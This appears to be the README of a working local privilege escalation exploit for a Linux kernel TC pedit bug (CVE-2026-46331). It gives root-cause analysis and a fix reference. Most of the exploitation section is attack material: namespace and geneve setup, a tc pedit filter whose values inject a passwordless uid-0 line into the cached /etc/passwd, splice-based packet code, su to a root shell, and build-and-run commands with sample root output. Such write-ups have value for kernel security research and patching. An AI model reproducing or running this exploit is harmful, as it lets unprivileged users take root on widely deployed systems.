# Dirty Pedit (CVE-2026-46331) — Local Privilege Escalation via TC Pedit COW Gap

A page-cache corruption vulnerability in the Linux kernel's Traffic Control (TC) packet editor that achieves deterministic root in under one second without requiring any cryptographic subsystem.

**CVE:** CVE-2026-46331
**Fix:** Upstream commit [`899ee91156e5`](https://github.com/torvalds/linux/commit/899ee91156e57784090c5565e4f31bd7dbffbc5a)

---

## Summary

An unprivileged local user can corrupt arbitrary readable files in the page cache by exploiting a u32 integer wraparound in `tcf_pedit_act()` that causes `skb_ensure_writable()` to protect fewer bytes than pedit subsequently writes. The write lands directly on page-cache-backed skb frag pages that entered the packet via `splice()`.

Unlike other page-cache exploits in this class (Dirty Frag, Fragnesia, skb_shift, GRO) which rely on ESP/AES-GCM crypto for the write primitive, Dirty Pedit uses TC's `skb_store_bits()` for a direct, fully-controlled 4-byte write per pedit key — no crypto, no IV tables, no key schedules.

---

## The Bug Class

Dirty Pedit belongs to the page-cache corruption lineage:

| Exploit | Year | Write Mechanism |
|---------|------|-----------------|
| Dirty COW | 2016 | COW race via mmap+fork |
| Dirty Pipe | 2022 | Stale PIPE_BUF_FLAG_CAN_MERGE |
| Copy Fail | 2026 | authencesn AF_ALG scratch write |
| Dirty Frag | 2026 | ESP skip_cow on splice'd frags |
| Fragnesia | 2026 | skb_try_coalesce flag loss |
| **Dirty Pedit** | 2026 | **TC pedit COW gap (u32 wraparound)** |

Every exploit in this class shares the same fundamental pattern: get page-cache pages into a kernel structure, bypass the ownership check, write in-place. What differs is HOW the defense is bypassed and WHAT performs the write.

---

## Root Cause: The Violated Invariant

**Location:** `net/sched/act_pedit.c` — `tcf_pedit_act()`

The developer's assumption: `skb_ensure_writable(max_offset)` linearizes (COWs) all bytes that pedit will subsequently write to. This invariant is violated.

### The Arithmetic

Before the per-key write loop, pedit computes:

```c
max_offset = (skb_transport_header_was_set(skb) ?
              skb_transport_offset(skb) :
              skb_network_offset(skb)) +
             parms->tcfp_off_max_hint;

skb_ensure_writable(skb, min(skb->len, max_offset));
```

The problem: `skb_transport_offset()` returns a **signed int**. After geneve decapsulation, `iptunnel_pull_header(skb, 16)` adjusts the data pointer forward by 16 bytes, making the transport header point BEFORE the new data start:

```
skb_transport_offset(skb) = transport_header - data = -16 (signed)
```

But `max_offset` is computed as **u32**:

```
max_offset = (u32)(-16) + hint
           = 0xFFFFFFF0 + 32
           = 16                 (u32 wraparound!)
```

So `skb_ensure_writable(16)` linearizes only bytes 0-15.

### The Actual Write

The per-key loop computes the write offset differently:

```c
hoffset = pedit_l4_skb_offset(skb);  // = noff + iph->ihl*4 = 0 + 20 = 20
// ...
skb_store_bits(skb, hoffset + tkey->off, ptr, 4);
//              → writes at byte 20, 24, 28
```

**Result:** COW covers bytes 0-15. Writes land at bytes 20, 24, 28. The frag pages at those offsets are still shared page-cache pages from `splice()`. `skb_store_bits` writes directly into them.

---

## What Makes This Exploit Unique

### 1. Novel Writer Primitive

Every other page-cache exploit in this class uses **crypto** as the writer:
- Dirty Frag / Fragnesia / skb_shift / GRO → ESP AES-GCM decrypt in-place
- Copy Fail → authencesn AEAD scratch write

Dirty Pedit uses **TC pedit** (`skb_store_bits`) — a direct 4-byte controlled write. No crypto subsystem involved. No key schedule. No IV table precomputation. The pedit key value IS the written data.

### 2. Novel Defense Bypass

Other exploits bypass the Dirty Frag defense by **losing the SKBFL_SHARED_FRAG flag** (Fragnesia, skb_shift, GRO). Dirty Pedit doesn't touch this flag at all — it bypasses a completely different defense (`skb_ensure_writable`) through a **u32 integer wraparound** triggered by a negative transport offset.

### 3. Co-located Invariant Violation + Writer

In skb_shift/GRO, the defense bypass (flag loss) happens in one subsystem (TCP SACK / GRO), and the writer (ESP decrypt) is in another (XFRM crypto). Exploitation requires chaining across subsystems.

In Dirty Pedit, the COW bypass and the write happen **in the same function** (`tcf_pedit_act`). The defense breaks and the write executes in the same call. That's why it's sub-second and trivial.

### 4. No Crypto Complexity

| Exploit | Crypto Setup Required |
|---------|----------------------|
| skb_shift | XFRM SA, ESP-in-TCP, AES-128-GCM, 256-entry IV table, 192 TCP connections |
| GRO | XFRM SA, ESP-in-UDP, AES-128-GCM, 256-entry IV table, veth pair |
| **Dirty Pedit** | **None. Just geneve + TC + splice.** |

---

## Exploitation

### Prerequisites

- `CONFIG_NET_ACT_PEDIT` (TC pedit action — default on all major distros)
- `CONFIG_USER_NS` (user namespaces — default on Ubuntu, Fedora, Debian)
- Read access to target file (O_RDONLY sufficient)

### Step-by-Step

#### 1. User Namespace

```c
unshare(CLONE_NEWUSER | CLONE_NEWNET);
// Map uid/gid, now have CAP_NET_ADMIN in the new network namespace
```

No real privileges on the host. Just a namespace.

#### 2. Geneve Tunnel (Negative Offset Generator)

```c
// Create geneve0 with inner_proto_inherit (L3 mode, no inner Ethernet header)
// Remote endpoint: 10.0.0.1 on loopback
// Port: 6081 (standard geneve)
```

When geneve receives a packet, `iptunnel_pull_header(skb, 16)` pulls the 16-byte geneve+options header. This sets `skb_transport_offset = -16` — the critical ingredient.

`inner_proto_inherit` puts geneve in L3 mode (no inner Ethernet header), so the inner packet starts directly at the IP header.

#### 3. TC Pedit Filter (The Writer)

```bash
tc qdisc add dev geneve0 ingress
tc filter add dev geneve0 ingress protocol all u32 match u32 0 0 \
    action pedit ex \
    munge offset 20 u32 set 0x613a3a30 \
    munge offset 24 u32 set 0x3a303a3a \
    munge offset 28 u32 set 0x2f3a0a0a
```

Three keys at offsets 20, 24, 28 (network-typed). The hint is 32 (max offset + 4 = 28 + 4).

The values encode (in network byte order):
- `0x613a3a30` = `a::0`
- `0x3a303a3a` = `:0::`
- `0x2f3a0a0a` = `/:\n\n`

Combined: `a::0:0::/:\n\n` — a valid `/etc/passwd` line defining user `a` with uid=0 and no password.

#### 4. Packet Construction (Splice Entry)

```c
// Build geneve header + inner IPv4 header (28 bytes total)
// vmsplice the header into a pipe
struct iovec iov = { .iov_base = header_buf, .iov_len = 28 };
vmsplice(pipe_wr, &iov, 1, 0);

// splice target file's page-cache pages as zero-copy frags
loff_t off = victim_line_offset;
splice(file_fd, &off, pipe_wr, NULL, 4096, SPLICE_F_MOVE);

// Send everything as one packet
splice(pipe_rd, NULL, udp_socket, NULL, 28 + 4096, SPLICE_F_MOVE);
```

The page-cache pages of the target file are now skb frags in the UDP packet, following the geneve+IP header.

#### 5. Trigger

The packet arrives at geneve on loopback:
1. Geneve decapsulates → `iptunnel_pull_header(16)` → transport_offset = -16
2. TC ingress qdisc matches → pedit action fires
3. `tcf_pedit_act` computes: `max_offset = (u32)(-16) + 32 = 16`
4. `skb_ensure_writable(16)` → linearizes only 16 bytes
5. Per-key loop writes at offsets 20, 24, 28 → **into page-cache frag pages**
6. 12 bytes of page cache corrupted with attacker-controlled data

#### 6. Privilege Escalation

```c
// Find last non-root line in /etc/passwd >= 12 bytes
int victim_offset = find_victim_offset("/etc/passwd");

// Corrupt it (3 sends for reliability)
for (int i = 0; i < 3; i++) send_packet(victim_offset);

// The page cache of /etc/passwd now contains:
//   Before: nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
//   After:  a::0:0::/:\n\n34:65534:nobody:/nonexistent:/usr/sbin/nologin
//           ^^^^^^^^^^^ valid root entry

// Login as the injected user
execlp("su", "su", "a", "-c", "exec /bin/sh", NULL);
// → root shell, no password
```

---

## Output

```
[*] Dirty Pedit — Local Privilege Escalation
[*] uid=1000 pid=42
[*] Victim line at offset 186: nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
[*] Injecting user 'a' (uid=0, no password) over victim line...
[*] /etc/passwd after:
root:x:0:0:root:/root:/bin/bash
...
a::0:0::/:\n
[+] User 'a' injected with uid=0!
[+] Running: su a
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

---

---

## Fix

The upstream fix (commit `899ee91156e5`) moves `skb_ensure_writable()` inside the per-key loop where the actual write offset is known, adds overflow checking on the offset arithmetic, and uses `skb_cow()` for negative offsets.

---

## Build & Run

```bash
gcc -static -o dirty_pedit_privesc dirty_pedit_privesc.c
./dirty_pedit_privesc
# → root shell in < 1 second
```

## Affected Configurations

- Any Linux kernel with `CONFIG_NET_ACT_PEDIT` + `CONFIG_USER_NS` (all major distros)
- Kernel versions: v5.18 through v7.1-rc6 (introduced by typed-key offset logic, fixed in v7.1-rc7)
- Also affected older stable backport branches: 4.19.244+, 5.4.195+, 5.10.117+, 5.15.41+, 5.17.9+
- Ubuntu 22.04/24.04/26.04, Fedora 43/44, Debian 12/13, RHEL 8/9/10, AlmaLinux 10 — all vulnerable in default config

